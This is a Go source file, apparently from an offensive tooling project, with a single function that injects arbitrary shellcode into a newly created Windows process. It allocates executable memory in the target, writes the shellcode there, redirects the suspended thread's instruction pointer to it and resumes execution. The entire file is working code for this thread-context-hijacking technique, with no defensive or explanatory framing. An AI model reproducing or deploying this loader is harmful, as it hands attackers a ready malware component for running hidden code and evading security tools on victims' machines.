package inject

import (
	"unsafe"
	"variant/log"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func SetContextThreadInject(shellcode []byte, dst string) {
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmd := windows.StringToUTF16Ptr(dst)

	err := windows.CreateProcess(
		nil,
		cmd,
		nil,
		nil,
		false,
		0,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		log.Fatalf("CreateProcessA err: %v", err)
	}

	_, err = xwindows.SuspendThread(pi.Thread)
	if err != nil {
		log.Fatalf("SuspendThread err: %v", err)
	}

	lpBuffer, err := xwindows.VirtualAllocEx(
		pi.Process,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		log.Fatalf("VirtualAllocEx err: %v", err)
	}

	err = xwindows.WriteProcessMemory(
		pi.Process,
		lpBuffer,
		&shellcode[0],
		uintptr(len(shellcode)),
		nil,
	)
	if err != nil {
		log.Fatalf("WriteProcessMemory err: %v", err)
	}
	//CONTEXT ctx = { 0 };
	var ctx xwindows.CONTEXT
	//ctx.ContextFlags = CONTEXT_ALL;
	ctx.ContextFlags = xwindows.CONTEXT_ALL
	//GetThreadContext(pi.hThread, &ctx);
	_, err = xwindows.GetThreadContext(pi.Thread, &ctx)
	if err != nil {
		log.Fatalf("GetThreadContext err: %v", err)
	}
	ctx.Rip = uint64(lpBuffer)

	_, err = xwindows.SetThreadContext(pi.Thread, &ctx)
	if err != nil {
		log.Fatalf("SetThreadContext err: %v", err)
	}

	_, err = xwindows.ResumeThread(pi.Thread)
	if err != nil {
		log.Fatalf("ResumeThread err: %v", err)
	}

}
